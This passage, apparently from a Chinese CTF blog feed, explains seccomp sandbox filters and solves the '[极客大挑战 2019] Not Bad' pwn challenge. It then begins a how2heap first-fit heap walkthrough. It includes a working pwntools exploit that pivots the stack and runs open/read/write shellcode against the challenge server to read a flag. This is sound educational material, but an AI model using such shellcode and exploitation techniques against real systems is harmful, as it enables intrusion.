class=\"string\">&lt;linux/bpf.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/filter.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/seccomp.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stddef.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">install_filter</span><span class=\"params\">(<span class=\"type\">int</span> nr, <span class=\"type\">int</span> arch, <span class=\"type\">int</span> error)</span> &#123;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_filter</span> <span class=\"title\">filter</span>[] =</span> &#123;</span><br><span class=\"line\">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class=\"keyword\">struct</span> seccomp_data, arch))),</span><br><span class=\"line\">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, arch, <span class=\"number\">0</span>, <span class=\"number\">3</span>),</span><br><span class=\"line\">      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, (offsetof(<span class=\"keyword\">struct</span> seccomp_data, nr))),</span><br><span class=\"line\">      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, nr, <span class=\"number\">0</span>, <span class=\"number\">1</span>),</span><br><span class=\"line\">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ERRNO | (error &amp; SECCOMP_RET_DATA)),</span><br><span class=\"line\">      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock_fprog</span> <span class=\"title\">prog</span> =</span> &#123;</span><br><span class=\"line\">      .len = (<span class=\"type\">unsigned</span> <span class=\"type\">short</span>)(<span class=\"keyword\">sizeof</span>(filter) / <span class=\"keyword\">sizeof</span>(filter[<span class=\"number\">0</span>])),</span><br><span class=\"line\">      .filter = filter,</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (prctl(PR_SET_SECCOMP, <span class=\"number\">2</span>, &amp;prog)) &#123;</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hey there!\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  install_filter(__NR_write, AUDIT_ARCH_X86_64, EPERM);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;something&#x27;s gonna happen!!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;it will not definitely print this here\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t用  <code>seccomp-tools</code>  来 dump 下看看：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:~/CTest/seccomp$ seccomp-tools dump ./prctl</span><br><span class=\"line\">hey there!</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0005</span><br><span class=\"line\"> 0004: 0x06 0x00 0x00 0x00050001  return ERRNO(1)</span><br><span class=\"line\"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>\n<p>​\t\t禁用掉之后，我们通过 seccomp 来 dump 一下。我们看到，最前面的就是 sock_filter 结构体的四个参数，后面的，就是 bpf 规则的汇编表示。</p>\n<h2 id=\"4-orw\"><a class=\"markdownIt-Anchor\" href=\"#4-orw\">#</a> 4、orw：</h2>\n<h3 id=\"极客大挑战-2019not-bad\"><a class=\"markdownIt-Anchor\" href=\"#极客大挑战-2019not-bad\">#</a> [极客大挑战 2019] Not Bad：</h3>\n<p>​\t\t先检查下保护：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:~/Temp$ checksec pwn</span><br><span class=\"line\">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX unknown - GNU_STACK missing</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">    Stack:    Executable</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<p>​\t\t没有开保护，且存在 RWX 段，IDA 看看：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mmap((<span class=\"type\">void</span> *)<span class=\"number\">0x123000</span>, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">6</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sub_400949();</span><br><span class=\"line\">  sub_400906();</span><br><span class=\"line\">  sub_400A16();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t函数名等等有问题，试着恢复下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  mmap((<span class=\"type\">void</span> *)<span class=\"number\">0x123000</span>, <span class=\"number\">0x1000</span>uLL, <span class=\"number\">6</span>, <span class=\"number\">34</span>, <span class=\"number\">-1</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  seccomp();</span><br><span class=\"line\">  init_0();</span><br><span class=\"line\">  vuln();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t简单恢复了下之后是这样，先看看 seccomp 函数，里面很明显存在沙盒（可能是种不专业的说法）：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 <span class=\"title function_\">seccomp</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = seccomp_init(<span class=\"number\">0LL</span>);</span><br><span class=\"line\">  seccomp_rule_add(v1, <span class=\"number\">2147418112LL</span>, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  seccomp_rule_add(v1, <span class=\"number\">2147418112LL</span>, <span class=\"number\">1LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  seccomp_rule_add(v1, <span class=\"number\">2147418112LL</span>, <span class=\"number\">2LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  seccomp_rule_add(v1, <span class=\"number\">2147418112LL</span>, <span class=\"number\">60LL</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> seccomp_load(v1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t好，那么直接用 seccomp-tools 工具 dump 一下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:~/Temp$ seccomp-tools dump ./pwn</span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class=\"line\"> 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010</span><br><span class=\"line\"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class=\"line\"> 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009</span><br><span class=\"line\"> 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009</span><br><span class=\"line\"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class=\"line\"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>\n<p>​\t\t最后发现可以利用的系统调用有 orw 三个，那么看看 vuln 函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_400A16</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x38</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里存在栈溢出，感觉可以打 shellcode，但是，明显发现栈的长度不够 ret2shellcode，推测一手栈迁移，试试看。</p>\n<p>​\t\t经过动调之后，发现在执行到函数 mmap 之后，存在一个可写可执行权限的内存段（扔一个小知识点：这里 mmap 参数类型是（起始地址，大小，保护类，文件描述符] 等））：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class=\"line\">             Start                End Perm     Size Offset File</span><br><span class=\"line\">          0x123000           0x124000 -wxp     1000      0 [anon_00123]</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以将栈迁移到这儿去，再执行 shellcode 或者 syscall 读文件，不过，这个要之后再说了。大概思路说下吧，先通过 shellcode 调用 read 函数将读文件写入内存然后输出这样的一个顺序，先贴一下 exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class=\"line\">Locale = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> Locale == <span class=\"number\">1</span>:</span><br><span class=\"line\">    io = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;node5.buuoj.cn&quot;</span>,<span class=\"number\">26888</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class=\"line\">context(arch=<span class=\"string\">&#x27;amd64&#x27;</span>, os=<span class=\"string\">&#x27;linux&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">    <span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">    mnap = <span class=\"number\">0x123000</span></span><br><span class=\"line\">    jmp_rsp = <span class=\"number\">0x0400a01</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Easy shellcode, have fun!\\n&quot;</span>)</span><br><span class=\"line\">    shellcode = asm(shellcraft.read(<span class=\"number\">0</span>,mnap,<span class=\"number\">0x100</span>))</span><br><span class=\"line\">    shellcode += asm(<span class=\"string\">&#x27;mov rax,0x123000;call rax&#x27;</span>)</span><br><span class=\"line\">    payload = shellcode.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;a&#x27;</span>)+p64(jmp_rsp)+asm(<span class=\"string\">&quot;sub rsp,0x30;jmp rsp&quot;</span>)\t\t<span class=\"comment\">#这里的减0x30我没怎么看懂，记录在这儿</span></span><br><span class=\"line\">    io.send(payload)</span><br><span class=\"line\">    payload2 = asm(shellcraft.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class=\"number\">3</span>,mnap+<span class=\"number\">0x100</span>,<span class=\"number\">0x100</span>)+shellcraft.write(<span class=\"number\">1</span>,mnap+<span class=\"number\">0x100</span>,<span class=\"number\">0x100</span>))</span><br><span class=\"line\">    io.send(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">exp()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>​</p>\n<h1 id=\"参考文章\"><a class=\"markdownIt-Anchor\" href=\"#参考文章\">#</a> 参考文章：</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=\">从 prctl 函数开始学习沙箱规则</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21yaGVzb25nemUvYXJ0aWNsZS9kZXRhaWxzLzEwMzAwODkyNQ==\">BPF 详解</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2x2eHU2NjYvYXJ0aWNsZS9kZXRhaWxzLzEzMDgyMTMzMA==\">函数 prctl 系统调用</span></p>\n",
            "tags": [
                "Pwn"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/2c0210e1.html",
            "url": "http://blog.g01den.top/posts/2c0210e1.html",
            "title": "how2heap_zh",
            "date_published": "2024-06-25T08:28:04.000Z",
            "content_html": "<p>​\t\t由于 Pwn 的堆方向感觉异常抽象，所以，我想着通过 how2heap 这个项目来入门 heap。但是，由于有的程序不知为何调试总是出问题，不过，我会慢慢来解决的，所以这个文章也是处于慢慢更新的状态。</p>\n<p>​\t\tglibc 版本：最新</p>\n<p>​\t\t源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;glibc 使用首次适应算法选择空闲的堆块\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;如果有一个空闲堆块且足够大，那么 malloc 将选择它\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;如果存在 use-after-free 的情况那可以利用这一特性\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;首先申请两个比较大的 chunk\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span>* a = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x512</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span>* b = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x256</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span>* c;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;第一个 a = malloc(0x512) 在: %p\\n&quot;</span>, a);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;第二个 a = malloc(0x256) 在: %p\\n&quot;</span>, b);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;我们可以继续分配\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;现在我们把 \\&quot;AAAAAAAA\\&quot; 这个字符串写到 a 那里 \\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(a, <span class=\"string\">&quot;AAAAAAAA&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;第一次申请的 %p 指向 %s\\n&quot;</span>, a, a);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;接下来 free 掉第一个...\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(a);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: %p\\n&quot;</span>, a);</span><br><span class=\"line\"></span><br><span class=\"line\">    c = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x500</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;第三次 c = malloc(0x500) 在: %p\\n&quot;</span>, c);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;我们这次往里写一串 \\&quot;CCCCCCCC\\&quot; 到刚申请的 c 中\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(c, <span class=\"string\">&quot;CCCCCCCC&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;第三次申请的 c %p 指向 %s\\n&quot;</span>, c, c);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;第一次申请的 a %p 指向 %s\\n&quot;</span>, a, a);</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \\&quot;CCCCCCCC\\&quot;\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t编译一下： <code>gcc -g first_fit.c</code></p>\n<p>​\t\t运行一下看看</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">g01den@MSI:~/Temp$ ./heap</span><br><span class=\"line\">尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制</span><br><span class=\"line\">glibc 使用首次适应算法选择空闲的堆块</span><br><span class=\"line\">如果有一个空闲堆块且足够大，那么 malloc 将选择它</span><br><span class=\"line\">如果存在 use-after-free 的情况那可以利用这一特性</span><br><span class=\"line\">首先申请两个比较大的 chunk</span><br><span class=\"line\">第一个 a = malloc(0x512) 在: 0x5595c3a182a0</span><br><span class=\"line\">第二个 a = malloc(0x256) 在: 0x5595c3a187c0</span><br><span class=\"line\">我们可以继续分配</span><br><span class=\"line\">现在我们把 <span class=\"string\">&quot;AAAAAAAA&quot;</span> 这个字符串写到 a 那里</span><br><span class=\"line\">第一次申请的 0x5595c3a182a0 指向 AAAAAAAA</span><br><span class=\"line\">接下来 free 掉第一个...</span><br><span class=\"line\">接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: 0x5595c3a182a0</span><br><span class=\"line\">第三次 c = malloc(0x500) 在: 0x5595c3a182a0</span><br><span class=\"line\">我们这次往里写一串 <span class=\"string\">&quot;CCCCCCCC&quot;</span> 到刚申请的 c 中</span><br><span class=\"line\">第三次申请的 c 0x5595c3a182a0 指向 CCCCCCCC</span><br><span class=\"line\">第一次申请的 a 0x5595c3a182a0 指向 CCCCCCCC</span><br><span class=\"line\">可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 <span class=\"string\">&quot;CCCCCCCC&quot;</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t开始调试：</p>\n<p>​\t\t首先，最开始，在第一次 malloc 分配内存之前，使用 vmmap 查看内存布局：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">vmmap</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">             Start                End Perm     Size Offset File</span><br><span class=\"line\">    0x555555554000     0x555555555000 r--p     1000      0 /home/g01den/Temp/how2heap/first</span><br><span class=\"line\">    0x555555555000     0x555555556000 